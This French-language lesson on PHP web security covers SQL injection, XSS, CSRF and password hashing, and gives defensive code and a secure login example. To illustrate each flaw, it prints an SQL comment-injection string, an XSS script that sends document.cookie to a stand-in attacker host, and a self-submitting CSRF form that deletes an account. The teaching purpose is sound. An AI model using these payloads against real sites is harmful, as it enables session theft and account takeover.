## Objectifs

- Adopter le principe « valider à l'entrée, échapper à la sortie »
- Comprendre, reproduire mentalement et empêcher l'injection SQL
- Se protéger des failles XSS
- Protéger les formulaires contre le CSRF
- Stocker et vérifier correctement les mots de passe
- Connaître le référentiel OWASP Top 10

## Le besoin

Un site web est accessible à **tout le monde**, y compris à des personnes malveillantes, et à des programmes qui testent automatiquement des milliers de sites à la recherche de failles connues. Quelques scénarios réels :

- en saisissant un texte bien choisi dans le champ de connexion, un attaquant se connecte **sans mot de passe** ;
- un commentaire publié sur le livre d'or contient un script qui **vole la session** de chaque visiteur, administrateurs compris ;
- un lien piégé envoyé par e-mail fait **supprimer un compte** à un utilisateur connecté, sans qu'il le sache ;
- après le vol d'une base de données, **tous les mots de passe** des utilisateurs sont lisibles, et réutilisables sur d'autres sites.

Aucun de ces scénarios ne demande de compétences exceptionnelles. Ils exploitent tous la même erreur : **faire confiance aux données reçues** ou mal protéger les données stockées. Ce cours présente les quatre protections indispensables de toute application web.

## Définitions

> **Faille de sécurité (vulnérabilité).** Une faiblesse du code qui permet à un attaquant de faire ce que l'application ne devrait pas autoriser.

> **Validation.** La vérification qu'une donnée reçue respecte le format attendu : type, longueur, valeurs autorisées.

> **Échappement.** La transformation des caractères spéciaux d'une donnée pour qu'ils soient traités comme du texte, et non comme du code, dans le contexte où elle est utilisée (HTML, SQL, URL).

> **Injection SQL.** Une faille qui permet d'insérer du code SQL dans une requête à travers une donnée reçue.

> **XSS (Cross-Site Scripting).** Une faille qui permet d'injecter du code JavaScript dans une page vue par d'autres utilisateurs.

> **CSRF (Cross-Site Request Forgery).** Une attaque qui fait exécuter une action à un utilisateur connecté, à son insu, depuis un autre site.

> **Hachage.** Une transformation à sens unique : on calcule facilement l'empreinte d'un mot de passe, mais on ne peut pas retrouver le mot de passe à partir de l'empreinte.

## Le principe fondamental

Une application reçoit des données de sources qu'elle ne contrôle pas : formulaires, URL, cookies, en-têtes HTTP, fichiers téléversés. La règle tient en une phrase :

> **Ne jamais faire confiance aux données reçues : les valider à l'entrée, les échapper à la sortie.**

| Étape | Question | Exemple |
|-------|----------|---------|
| Valider à l'entrée | La donnée a-t-elle le format attendu ? | Un e-mail valide, un entier entre 1 et 20 |
| Échapper à la sortie | La donnée peut-elle être prise pour du code là où je l'utilise ? | `htmlspecialchars` en HTML, requête préparée en SQL |

La validation ne suffit pas seule : un commentaire valide peut contenir `<script>`. L'échappement dépend du **contexte** de sortie : ce qui protège en HTML ne protège pas en SQL.

## L'injection SQL

### Le mécanisme

Une injection SQL survient quand une donnée reçue est **concaténée** dans une requête.

```php
// Vulnérable
$email = $_POST['email'];
$motDePasse = $_POST['mot_de_passe'];
$requete = "SELECT * FROM utilisateurs WHERE email = '$email' AND mot_de_passe = '$motDePasse'";
```

L'attaquant saisit dans le champ e-mail : `admin@exemple.fr' -- ` (avec un espace final). La requête devient :

```sql
SELECT * FROM utilisateurs WHERE email = 'admin@exemple.fr' -- ' AND mot_de_passe = '...'
```

Les caractères `-- ` ouvrent un commentaire en SQL : toute la vérification du mot de passe est ignorée. L'attaquant est connecté en tant qu'administrateur. D'autres saisies permettent de lire des tables entières avec `UNION SELECT`, ou de supprimer des données.

### La parade : la requête préparée

```php
$requete = $pdo->prepare('SELECT id, mot_de_passe FROM utilisateurs WHERE email = :email');
$requete->execute(['email' => $_POST['email']]);
```

La structure de la requête est fixée avant que la donnée n'arrive. La saisie de l'attaquant n'est qu'une chaîne à comparer : aucun utilisateur n'a pour adresse `admin@exemple.fr' -- `.

### Les éléments qui ne se préparent pas

Un **nom de colonne** ou un **sens de tri** ne peuvent pas être passés en paramètre. Si l'utilisateur les choisit, comparez sa saisie à une **liste blanche** de valeurs autorisées :

```php
$colonnesTriables = ['titre', 'prix', 'duree_heures'];
$tri = in_array($_GET['tri'] ?? '', $colonnesTriables, true) ? $_GET['tri'] : 'titre';
$sens = ($_GET['sens'] ?? '') === 'desc' ? 'DESC' : 'ASC';

$formations = $pdo->query("SELECT titre, prix FROM formations ORDER BY $tri $sens")->fetchAll();
```

Ici, la concaténation est sûre : `$tri` et `$sens` ne peuvent prendre que des valeurs choisies par le développeur.

## Le XSS

### Le mécanisme

Une faille XSS survient quand une donnée est affichée dans une page **sans être échappée**. Un attaquant publie dans le livre d'or :

```html
<script>fetch('https://attaquant.exemple/vol?c=' + document.cookie)</script>
```

Le site stocke le message tel quel, puis l'affiche :

```php
<p><?= $message ?></p>     <!-- vulnérable -->
```

Chaque visiteur qui affiche la page **exécute** ce script dans son navigateur, avec sa propre session. Si un administrateur la consulte, l'attaquant récupère son cookie de session et peut se faire passer pour lui.

| Type de XSS | Origine du script |
|-------------|-------------------|
| Stocké | Enregistré en base, affiché à tous les visiteurs : livre d'or, commentaires, profil |
| Réfléchi | Présent dans l'URL, renvoyé dans la page : un lien piégé vers `recherche.php?q=<script>...` |

### La parade : échapper à l'affichage

```php
<p><?= htmlspecialchars($message, ENT_QUOTES, 'UTF-8') ?></p>
```

`htmlspecialchars` convertit les caractères qui ont un sens en HTML en **entités** :

| Caractère | Devient |
|-----------|---------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#039;` |

Le navigateur **affiche** alors `<script>` comme du texte au lieu de l'exécuter. On échappe au moment de l'**affichage**, pas au moment de l'enregistrement : la base conserve la donnée d'origine, et chaque contexte de sortie applique son propre échappement.

Les moteurs de gabarits comme **Blade** dans Laravel échappent automatiquement avec la syntaxe `{{ $variable }}`.

### Protections complémentaires

- L'attribut `HttpOnly` sur le cookie de session le rend inaccessible au JavaScript : même en cas de XSS, `document.cookie` ne le contient pas.
- L'en-tête HTTP `Content-Security-Policy` peut interdire l'exécution de scripts non autorisés.

Ces protections limitent les dégâts, mais ne remplacent pas l'échappement.

## Le CSRF

### Le mécanisme

Emma est connectée à la plateforme de formation. Elle visite un autre site, piégé, qui contient :

```html
<form action="https://formations.exemple.fr/compte/supprimer" method="post" id="piege"></form>
<script>document.getElementById('piege').submit();</script>
```

Le formulaire est envoyé automatiquement vers la plateforme. Le navigateur y joint le **cookie de session** d'Emma, comme pour toute requête vers ce site. Pour le serveur, la requête vient d'Emma, connectée : son compte est supprimé.

### La parade : le jeton CSRF

Le serveur génère une **valeur aléatoire** stockée en session et l'ajoute, en champ caché, à chacun de ses formulaires. À la réception, il vérifie que le jeton reçu correspond à celui de la session. Le site piégé ne peut pas connaître ce jeton : sa requête est refusée.

```php
// Génération, une fois par session
$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
```

```php
<form method="post" action="supprimer.php">
    <input type="hidden" name="csrf" value="<?= htmlspecialchars($_SESSION['csrf']) ?>">
    <button type="submit">Supprimer mon compte</button>
</form>
```

```php
// À la réception
if (!hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '')) {
    http_response_code(403);
    exit('Requête refusée');
}
```

- `random_bytes` produit des octets **cryptographiquement sûrs**, imprévisibles. `rand()` ou `uniqid()` ne le sont pas.
- `hash_equals` compare en **temps constant** : un attaquant ne peut pas deviner le jeton caractère par caractère en mesurant le temps de réponse.

L'attribut de cookie `SameSite=Lax`, appliqué par défaut par les navigateurs récents, empêche l'envoi du cookie lors de la plupart des requêtes venues d'autres sites. C'est une protection complémentaire, pas un remplaçant du jeton.

Laravel génère et vérifie ce jeton automatiquement : il suffit d'ajouter `@csrf` dans chaque formulaire.

## Les mots de passe

### Ce qu'il ne faut pas faire

| Stockage | Problème |
|----------|----------|
| En clair | Un vol de la base livre tous les mots de passe |
| Chiffré (réversible) | La clé de déchiffrement est sur le même serveur : elle sera volée avec la base |
| MD5 ou SHA-1 | Ces hachages sont **très rapides** : un ordinateur en calcule des milliards par seconde, et des tables précalculées retrouvent instantanément les mots de passe courants |

### La bonne pratique

Un mot de passe se **hache** avec un algorithme **lent** et **salé** :

- **lent** : chaque essai coûte du temps de calcul, ce qui rend les attaques par force brute extrêmement coûteuses ;
- **salé** : une valeur aléatoire (le sel) est ajoutée à chaque mot de passe avant le hachage. Deux utilisateurs avec le même mot de passe ont des empreintes différentes, et les tables précalculées deviennent inutiles.

PHP fournit tout cela en deux fonctions :

```php
// À l'inscription
$empreinte = password_hash($motDePasse, PASSWORD_DEFAULT);
// $2y$10$Q8m3v... : l'algorithme, le coût et le sel sont inclus dans l'empreinte

// À la connexion
if (password_verify($motDePasseSaisi, $utilisateur['mot_de_passe'])) {
    session_regenerate_id(true);
    $_SESSION['utilisateur_id'] = $utilisateur['id'];
}
```

- `PASSWORD_DEFAULT` utilise aujourd'hui **bcrypt** et suivra les évolutions de PHP.
- La colonne qui stocke l'empreinte doit accepter au moins **255 caractères**, pour les algorithmes futurs.
- `password_needs_rehash` permet de mettre à niveau une ancienne empreinte à la connexion suivante.

### Ne rien révéler à la connexion

Affichez le **même message** que l'adresse soit inconnue ou le mot de passe faux : « Identifiants incorrects ». Un message différent indiquerait à un attaquant quelles adresses possèdent un compte. Complétez par une **limitation du nombre d'essais**, par adresse IP et par compte.

## Récapitulatif

| Faille | Cause | Parade |
|--------|-------|--------|
| Injection SQL | Donnée concaténée dans une requête | Requêtes préparées, liste blanche pour les noms de colonnes |
| XSS | Donnée affichée sans échappement | `htmlspecialchars` à l'affichage, moteur de gabarits, cookie `HttpOnly` |
| CSRF | Action déclenchée depuis un autre site | Jeton CSRF, cookie `SameSite` |
| Vol de mots de passe | Stockage en clair ou hachage rapide | `password_hash` et `password_verify` |

## L'OWASP Top 10

L'**OWASP** (Open Worldwide Application Security Project) est une fondation qui publie le **Top 10**, la liste des risques les plus critiques des applications web, mise à jour régulièrement. On y retrouve l'injection, le contrôle d'accès défaillant, les défauts de cryptographie ou l'utilisation de composants vulnérables. C'est une lecture recommandée pour tout développeur, et une référence dans les audits de sécurité.

## Exemple complet

Un formulaire de connexion qui applique toutes les protections du cours :

```php
<?php

declare(strict_types=1);

session_start();
$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$erreur = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Requête refusée');
    }

    $email = trim($_POST['email'] ?? '');
    $requete = $pdo->prepare('SELECT id, mot_de_passe FROM utilisateurs WHERE email = :email');
    $requete->execute(['email' => $email]);
    $utilisateur = $requete->fetch();

    if ($utilisateur !== false && password_verify($_POST['mot_de_passe'] ?? '', $utilisateur['mot_de_passe'])) {
        session_regenerate_id(true);
        $_SESSION['utilisateur_id'] = $utilisateur['id'];
        header('Location: tableau-de-bord.php', true, 303);
        exit;
    }

    $erreur = 'Identifiants incorrects.';
}
?>
<form method="post">
    <input type="hidden" name="csrf" value="<?= htmlspecialchars($_SESSION['csrf']) ?>">
    <input type="email" name="email" value="<?= htmlspecialchars($email ?? '') ?>">
    <input type="password" name="mot_de_passe">
    <?php if ($erreur !== null): ?>
        <p class="erreur"><?= htmlspecialchars($erreur) ?></p>
    <?php endif; ?>
    <button type="submit">Se connecter</button>
</form>
```

| Ligne | Protection |
|-------|------------|
| `hash_equals($_SESSION['csrf'], ...)` | CSRF |
| `$pdo->prepare(...)` | Injection SQL |
| `password_verify(...)` | Mots de passe hachés |
| `session_regenerate_id(true)` | Fixation de session |
| Un seul message d'erreur | Pas de révélation des comptes existants |
| `htmlspecialchars(...)` | XSS au réaffichage |

## Les erreurs fréquentes

- **Échapper à l'enregistrement plutôt qu'à l'affichage**, et des données doublement échappées ou oubliées selon les pages.
- **Croire qu'une validation suffit** contre le XSS.
- **Un jeton CSRF prévisible**, généré avec `rand()` ou `uniqid()`.
- **MD5 ou SHA-256 pour des mots de passe.**
- **Des messages d'erreur différents** selon que le compte existe ou non.
- **Protéger seulement les formulaires « importants »** : un seul oubli suffit à un attaquant.

## Retour au besoin

Les quatre scénarios du début sont neutralisés. La connexion sans mot de passe échoue face à la requête préparée. Le script du livre d'or s'affiche comme du texte. Le lien piégé est refusé faute de jeton CSRF. Et une base volée ne livre que des empreintes lentes à attaquer. La sécurité n'est pas une fonctionnalité que l'on ajoute à la fin : ce sont des réflexes appliqués à chaque ligne qui reçoit ou affiche une donnée. Les frameworks comme Laravel les appliquent par défaut, et c'est une raison majeure de les utiliser.

## À retenir

- Valider à l'entrée, échapper à la sortie, selon le contexte.
- Requêtes préparées contre l'injection SQL, liste blanche pour ce qui ne se prépare pas.
- `htmlspecialchars` à l'affichage contre le XSS.
- Un jeton CSRF aléatoire dans chaque formulaire qui modifie des données.
- `password_hash` et `password_verify`, jamais de mot de passe en clair ni de hachage rapide.

## Pour aller plus loin

- L'OWASP Top 10 : [owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten/)
- La sécurité des mots de passe dans le manuel officiel : [php.net/manual/fr/faq.passwords.php](https://www.php.net/manual/fr/faq.passwords.php)
